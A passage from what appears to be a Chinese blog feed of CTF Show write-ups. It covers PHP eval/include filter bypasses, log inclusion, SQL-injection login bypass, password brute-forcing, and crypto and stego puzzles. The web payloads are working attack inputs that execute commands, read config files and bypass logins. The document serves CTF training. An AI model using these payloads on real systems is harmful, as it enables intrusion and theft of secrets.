class="variable">$_GET</span>[1]?&gt;&amp;1=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=config.php</span><br><span class="line"><span class="comment"># ?&gt; 闭合</span></span><br><span class="line">?c=passthru(<span class="string">&#x27;tac con\fig*&#x27;</span>)?&gt;</span><br></pre></td></tr></table></figure><h2 id="Web-14"><a href="#Web-14" class="headerlink" title="Web 14"></a>Web 14</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># include + 伪协议</span></span><br><span class="line">?c=include<span class="variable">$_GET</span>[1]?&gt;&amp;1=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=config.php</span><br><span class="line"></span><br><span class="line">?c=<span class="built_in">echo</span> `<span class="variable">$_GET</span>[a]`?&gt;&amp;a=tac config.php</span><br></pre></td></tr></table></figure><h2 id="Web-15-—-过滤"><a href="#Web-15-—-过滤" class="headerlink" title="Web 15 — 过滤 ?"></a>Web 15 — 过滤 ?</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>过滤问号 ?</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="built_in">echo</span> `<span class="variable">$_GET</span>[a]`;&amp;a=tac config.php</span><br><span class="line">?c=include<span class="variable">$_GET</span>[1];&amp;1=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure><h2 id="Web-16"><a href="#Web-16" class="headerlink" title="Web 16"></a>Web 16</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="string">&quot;ctfshow<span class="variable">$c</span>&quot;</span>)===<span class="string">&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> str1:</span><br><span class="line">            s = hashlib.md5((<span class="string">&#x27;ctfshow&#x27;</span>+i+j+k).encode()).hexdigest()</span><br><span class="line">            <span class="comment">#print(type(s))</span></span><br><span class="line">            <span class="keyword">if</span> s==<span class="string">&#x27;a6f57ae38a22448c2f07f3f95f49c84e&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(i+j+k)</span><br></pre></td></tr></table></figure><p>得到 36d</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=36d</span><br></pre></td></tr></table></figure><h2 id="Web-17-21-—-日志包含"><a href="#Web-17-21-—-日志包含" class="headerlink" title="Web 17-21 — 日志包含"></a>Web 17-21 — 日志包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">               include(<span class="variable">$c</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>日志包含</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/var/<span class="built_in">log</span>/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/16/rN8xalpn9bUyQYC.png" alt="image-20210816170943818"></p><p><img src="https://i.loli.net/2021/08/16/JjBqbcYu4tSeZCR.png" alt="image-20210816170929174"></p><h2 id="Web-18"><a href="#Web-18" class="headerlink" title="Web 18"></a>Web 18</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php|file/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">               include(<span class="variable">$c</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="密码1"><a href="#密码1" class="headerlink" title="密码1"></a>密码1</h2><p>密文：</p><p>53316C6B5A6A42684D3256695A44566A4E47526A4D5459774C5556375A6D49324D32566C4D4449354F4749345A6A526B4F48303D</p><p><a href="https://www.bejson.com/convert/ox2str/">十六进制到文本字符串</a></p><p><img src="https://i.loli.net/2021/08/17/37tyQmEvxOznSMe.png" alt="image-20210817123630323"></p><p>再 base64 解码</p><p>KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8}</p><p><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码解码</a></p><p><img src="https://i.loli.net/2021/08/17/EIhugz4SwcoKYAH.png" alt="image-20210817123823370"></p><h2 id="密码2"><a href="#密码2" class="headerlink" title="密码2"></a>密码2</h2><p>出题人已累，随便敲了几下键盘。。。 rdcvbg 2qase3 6tghu7</p><p>rdcvbg 2qase3 6tghu7</p><p>​    f             w            y</p><p>三组，包围</p><p>KEY{fwy}</p><h2 id="密码3"><a href="#密码3" class="headerlink" title="密码3"></a>密码3</h2><p>题目名称：我想吃培根 题目描述： – — .-. … . ..–.- .. … ..–.- -.-. — — .-.. ..–.- -… ..- - ..–.- -… .- -.-. — -. ..–.- .. … ..–.- -.-. — — .-.. . .-. ..–.- – – -.. -.. – -.. – -.. – – – -.. -.. -.. /– -.. – -.. -.. –/ – – – – – /– -.. -.. – -.. – /– -.. -.. – </p><p>格式：flag{***********}</p><p><a href="http://moersima.00cha.net/">摩斯密码解密</a></p><p><img src="https://i.loli.net/2021/08/17/Wu86T7wcbpKENGS.png" alt="image-20210817124449077"></p><p>得到  mmddmdmdmmmdddmdmddmmmmmmmddmdmmddm</p><p>将 m 替换成 A，d 替换成 B  ，AABBABABAAABBBABABBAAAAAAABBABAABBA</p><p><a href="http://rumkin.com/tools/cipher/baconian.php">培根密码解密</a></p><p><img src="https://i.loli.net/2021/08/17/LYK8a6bdl7PXJCV.png" alt="image-20210817124828352"></p><h2 id="密码-4"><a href="#密码-4" class="headerlink" title="密码#4"></a>密码#4</h2><p>QW8obWdIWF5FKUFSQW5URihKXWZAJmx0OzYiLg==</p><p>base64 得到 Ao(mgHX^E)ARAnTF(J]f@&lt;6”.</p><p>然后 <a href="http://ctf.ssleye.com/base85.html">base85</a></p><p><img src="https://i.loli.net/2021/08/17/oYHs4R3jJpMWIAv.png" alt="image-20210817125211103"></p><h2 id="隐写1"><a href="#隐写1" class="headerlink" title="隐写1"></a>隐写1</h2><p>下载到本地，打不开</p><p>010 查看，文件头损坏</p><p><img src="https://i.loli.net/2021/08/17/P4ovewZGTFLhA2I.png" alt="image-20210817181956643"></p><p>更改为 89 后保存，打开即可</p><h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p>下载工具，打开图片，点击 Seek ，密码为空，保存，得到所解出的密文</p><p><img src="https://i.loli.net/2021/08/17/or8TfdwiM2mlnUY.png" alt="image-20210817183021842"></p><h2 id="萌新-隐写2-—-zip-伪加密-ziperello-暴力破解"><a href="#萌新-隐写2-—-zip-伪加密-ziperello-暴力破解" class="headerlink" title="萌新 隐写2 — zip 伪加密 ziperello 暴力破解"></a>萌新 隐写2 — zip 伪加密 ziperello 暴力破解</h2><p><img src="https://i.loli.net/2021/08/17/lGEF96pw4gOLsfh.png" alt="image-20210817183327452"></p><p>zip 伪加密 ziperello 工具</p><p><img src="https://i.loli.net/2021/08/17/PDVweJF4S86xgUA.png" alt="image-20210817184618928"></p><p><img src="https://i.loli.net/2021/08/17/H6Cgfo5kdBIj9wu.png" alt="image-20210817184906246"></p><p>伪加密是09，这里是01，是真有密码。</p><h2 id="萌新-隐写3"><a href="#萌新-隐写3" class="headerlink" title="萌新 隐写3"></a>萌新 隐写3</h2><p><img src="https://i.loli.net/2021/08/17/gkKmvdftDxL9Wze.png" alt="image-20210817185117999"></p><h2 id="萌新-隐写4-—-doc"><a href="#萌新-隐写4-—-doc" class="headerlink" title="萌新 隐写4 — .doc"></a>萌新 隐写4 — .doc</h2><p><img src="https://i.loli.net/2021/08/17/UOcV19hzEuKBLg3.png" alt="image-20210817185432792"></p><p>打开之后，可以看见存在换行，在 word 选项中设置 显示隐藏文字</p><p><img src="https://i.loli.net/2021/08/17/TbIxswakcjGznpg.png" alt="image-20210817185525227"></p><p><img src="https://i.loli.net/2021/08/17/9BRSyYAtN8LKFhg.png" alt="image-20210817185557410"></p><h2 id="萌新-隐写5"><a href="#萌新-隐写5" class="headerlink" title="萌新 隐写5"></a>萌新 隐写5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">䴀娀圀䜀䌀娀娀䤀一䈀儀圀㘀堀㌀䬀一䘀㈀嘀㘀夀吀嘀䰀㔀㐀圀㘀㌀吀䠀䰀㔀刀䐀䜀䴀匀㜀䘀䔀㴀㴀㴀㴀㴀㴀\\=。=//</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/17/bIjpZQl4BOWaeNG.png" alt="image-20210817185848751"></p><p><img src="https://i.loli.net/2021/08/17/W5IjJqcSChwnm9d.png" alt="image-20210817185922758"></p><p>MZWGCZZINBQW6X3KNF2V6YTVL54W63THL5RDGMS7FE======</p><p>base32</p><h2 id="萌新6-—-flac-音频-—-audacity-工具"><a href="#萌新6-—-flac-音频-—-audacity-工具" class="headerlink" title="萌新6 — .flac 音频 — audacity 工具"></a>萌新6 — .flac 音频 — audacity 工具</h2><p><img src="https://i.loli.net/2021/08/17/bLpFINq2R8olt6x.png" alt="image-20210817201257731"></p><p>左声道 样子像 摩斯电码</p><p>将右声道设置为静音，提高音量，导出为 Mp3</p><p><img src="https://i.loli.net/2021/08/17/B9aT5KnhpHCqksz.png" alt="image-20210817201422588"></p><p>打开 <a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">摩斯电码音频解码工具</a></p><p><img src="https://i.loli.net/2021/08/17/SE9HhpjF38Arywc.png" alt="image-20210817201634242"></p><p>有误差 ，答案是 flag{MUZIKISG00D}</p><h2 id="杂项1"><a href="#杂项1" class="headerlink" title="杂项1"></a>杂项1</h2><p>小明想给心爱的妹子表白很久，可是不知道怎么开口，你能帮帮小明吗？</p><p>已知 md5(表白的话+ctf)=ed400fbcff269bd9c65292a97488168a</p><p>提交flag{表白的话}</p><p><a href="https://cmd5.la/user/index.php">https://cmd5.la/user/index.php</a></p><p><img src="https://i.loli.net/2021/08/17/mMPvgeCLOqrRS7h.png" alt="image-20210817203719294"></p><h2 id="杂项2"><a href="#杂项2" class="headerlink" title="杂项2"></a>杂项2</h2><p><img src="https://i.loli.net/2021/08/17/IqzhFbQX72HYLCm.png" alt="image-20210817204057302"></p><h2 id="萌新-杂项3"><a href="#萌新-杂项3" class="headerlink" title="萌新 杂项3"></a>萌新 杂项3</h2><p>大家好我是小萌新羽，前不久我的一个朋友给我了一张银行卡，他说里面有一大笔钱，但是他只告诉我他的生日是九七年十月一日，你能帮我猜猜他的银行卡密码是多少吗，哦对，这个朋友有个小名叫小五。</p><p>flag格式：flag{银行卡密码}</p><p>flag{971015}</p><h2 id="杂项4"><a href="#杂项4" class="headerlink" title="杂项4"></a>杂项4</h2><p>小明心爱的图片在压缩包中，可是小明夜深人静的时候，孤枕难眠，想打开图片排遣寂寞，可是忘记了密码了，小米依稀记得9位的密码都是数字，前3位是372，你能帮助小明吗？</p><p>zip 压缩包 </p><ul><li>ziperello 直接爆破得到密码</li></ul><p><img src="https://i.loli.net/2021/08/17/QILvVmMF8zhdAS7.png" alt="image-20210817205231263"></p><ul><li>ARCHPR 掩码</li></ul><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817205050082.png" alt="image-20210817205050082"></p><h2 id="杂项5"><a href="#杂项5" class="headerlink" title="杂项5"></a>杂项5</h2><p>小明如愿以偿的打开了压缩包，可是眼前的文字自己只能认识FBI，其他的都不认识，而且屏幕出现了一句话，你能帮小明找到这句话的意思吗？</p><p><img src="https://i.loli.net/2021/08/17/qudxZoKW1PXUjE9.png" alt="image-20210817205505223"></p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817205640153.png" alt="image-20210817205640153"></p><h2 id="杂项6"><a href="#杂项6" class="headerlink" title="杂项6"></a>杂项6</h2><p>小明的压缩包又忘记密码了？他去电脑维修店去修，人家扔出来说这个根本就没有密码，是个假密码。小明懵了，明明有密码的啊，你能帮帮小明吗？</p><p>伪加密 ，将 09 替换成 00</p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817210106625.png" alt="image-20210817210106625"></p><h2 id="杂项7"><a href="#杂项7" class="headerlink" title="杂项7"></a>杂项7</h2><p>小明小心翼翼的打开压缩包，竟然是个图片，什么鬼？</p><p>要是图片能继续往长一点该多好啊，小明暗暗的想。</p><p>你能帮小明完成这个朴素的梦想吗？</p><p>图片 SRC</p><p><img src="https://i.loli.net/2021/08/17/XHLgEo1clnfyOBs.png" alt="image-20210817210418869"></p><p>计算图片正确的宽和高</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">m = <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">    <span class="keyword">if</span> k==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">        c = m[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+m[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc = binascii.crc32(c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc == <span class="number">0x889C2F07</span>:</span><br><span class="line">            k = <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(i),<span class="built_in">hex</span>(j))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817210616232.png" alt="image-20210817210616232"></p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817210714567.png" alt="image-20210817210714567"></p><h2 id="杂项8"><a href="#杂项8" class="headerlink" title="杂项8"></a>杂项8</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">m = open(<span class="string">&quot;flag.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">k=0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(5000):</span><br><span class="line">    <span class="keyword">if</span> k==1:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(5000):</span><br><span class="line">        c = m[12:16] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+m[24:29]</span><br><span class="line">        crc = binascii.crc32(c) &amp; 0xffffffff</span><br><span class="line">        <span class="keyword">if</span> crc == 0x889C2F07:</span><br><span class="line">            k = 1</span><br><span class="line">            <span class="built_in">print</span>(hex(i),hex(j))</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure><p>和杂项7一样，修改正确的宽高</p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817211616036.png" alt="image-20210817211616036"></p><h2 id="杂项9-—-链接失效-—-过"><a href="#杂项9-—-链接失效-—-过" class="headerlink" title="杂项9 — 链接失效 — 过"></a>杂项9 — 链接失效 — 过</h2><p>题目地址： 链接: <a href="https://pan.baidu.com/s/1XqF-OyHbH5WHFEUJvVZPEA">https://pan.baidu.com/s/1XqF-OyHbH5WHFEUJvVZPEA</a> 提取码: fcg3</p><p>要求：写一个本地外挂，小地图显示全图。</p><p>提示：游戏版本1.24E，修改game.dll</p><p>提交小地图全图基址即可。例如：flag{0xxxxxxx}</p><h2 id="杂项10"><a href="#杂项10" class="headerlink" title="杂项10"></a>杂项10</h2><p><img src="https://i.loli.net/2021/08/17/WkIsNA3Zd9oYrvD.png" alt="image-20210817212449610"></p><p>摘掉眼镜，仔细看图片</p><p>flag{我好喜欢你}</p><h2 id="杂项11"><a href="#杂项11" class="headerlink" title="杂项11"></a>杂项11</h2><p>密码为空，提取文件得到 1.jpg，一个二维码</p><p><img src="https://i.loli.net/2021/08/17/8oLmaJEkfY1U2yW.png" alt="image-20210817212951757"></p><p>使用 二维码扫描工具扫描，得到</p><p><img src="https://i.loli.net/2021/08/17/mInpy7OwPF9chWV.png" alt="image-20210817213220467"></p><p>base64 解码得到</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-黑盒测试</title>
    <link href="https://xizhi-future.github.io/2021/11/19/CTF-Show-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    <id>https://xizhi-future.github.io/2021/11/19/CTF-Show-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</id>
    <published>2021-11-19T07:14:09.000Z</published>
    <updated>2021-11-19T07:15:45.222Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、黑盒测试"><a href="#一、黑盒测试" class="headerlink" title="一、黑盒测试"></a>一、黑盒测试</h1><h2 id="1-1-Web-380"><a href="#1-1-Web-380" class="headerlink" title="1.1 Web 380"></a>1.1 Web 380</h2><p>扫目录可以发现</p><p><img src="https://i.loli.net/2021/08/04/oQUxOMAecNVramB.png" alt="image-20210804135546210"></p><p><img src="https://i.loli.net/2021/08/04/PHiK79wfyUxTWGe.png" alt="image-20210804135326954"></p><p>尝试 ?id=2</p><p><img src="https://i.loli.net/2021/08/04/pgPURTNBjht75o6.png" alt="image-20210804135348176"></p><p>可以看到是 <code>file_get_contents</code> </p><p>那 <code>?id=flag</code> 尝试 ，查源码得到</p><h2 id="1-2-Web-381"><a href="#1-2-Web-381" class="headerlink" title="1.2 Web 381"></a>1.2 Web 381</h2><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210804135637994.png" alt="image-20210804135637994"></p><p>可以看到这里与之前不同，但是尝试访问过后，依旧不行</p><p>那继续扫，发现，仍然得到了 <code>page.php</code></p><p><img src="https://i.loli.net/2021/08/04/lC5HYPfB4xVj9DE.png" alt="image-20210804140001237"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br><span class="line">2 3 4</span><br><span class="line"><span class="comment"># 发现对应的是每一篇报道</span></span><br></pre></td></tr></table></figure><p>依次访问，最终无所获，且尝试过后 <code>page_flag.php</code> 应该也是不存在的</p><p>又回到最初发现的原密码目录，再次尝试，成功</p><p><img src="https://i.loli.net/2021/08/04/SrIFG9wsRJ6mzAQ.png" alt="image-20210804140511148"></p><h2 id="1-3-Web-382-383"><a href="#1-3-Web-382-383" class="headerlink" title="1.3 Web 382-383"></a>1.3 Web 382-383</h2><p>这次再直接访问过后，就是登录页面</p><p><img src="https://i.loli.net/2021/08/04/u5OVsHQIXcv7lBe.png" alt="image-20210804140652142"></p><p><strong>SQL 万能密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username: admin<span class="string">&#x27;or&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/JTAzCBqfjY9sahW.png" alt="image-20210804140903548"></p><p><strong>密码爆破</strong></p><p><img src="https://i.loli.net/2021/08/04/DW685jRtagGKIeb.png" alt="image-20210804141939521"></p><h2 id="1-4-Web-384"><a href="#1-4-Web-384" class="headerlink" title="1.4 Web 384"></a>1.4 Web 384</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密码前2位是小写字母，后三位是数字</span><br></pre></td></tr></table></figure><p>万能密码不可行，只能根据题目进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line"><span class="built_in">print</span>(i,j)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/GK4kNicyxXmhBvV.png" alt="image-20210804144019115"></p><h2 id="1-5-Web-385"><a href="#1-5-Web-385" class="headerlink" title="1.5 Web 385"></a>1.5 Web 385</h2><p>同样有后台登录，但是密码也没有提示，我们先不进行爆破</p><p>扫目录，有新的发现</p><p><img src="https://i.loli.net/2021/08/04/TtuqMYQVP65XOe9.png" alt="image-20210804144556248"></p><p><img src="https://i.loli.net/2021/08/04/qeb5Y4MXhUW29KP.png" alt="image-20210804144644455"></p><p><img src="https://i.loli.net/2021/08/04/sGpZi9luOXMehTP.png" alt="image-20210804144714402"></p><p>证明我们已经重置了密码，那么 所谓的 默认密码是多少呢？</p><p>不管是多少，肯定是弱密码，我们可以再进行爆破，也可以结合之前所爆破出来的密码尝试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin888</span><br></pre></td></tr></table></figure><h2 id="1-6-Web-386"><a href="#1-6-Web-386" class="headerlink" title="1.6 Web 386"></a>1.6 Web 386</h2><p>说是扫出来的 <code>clear.php</code> ，但是我 dirsearch 没有扫出来，说白了，还是字典不够强大</p><p><img src="https://i.loli.net/2021/08/04/XCiA4ofnjSg5YJM.png" alt="image-20210804145328318"></p><p>也就是说，我们需要首先清除掉 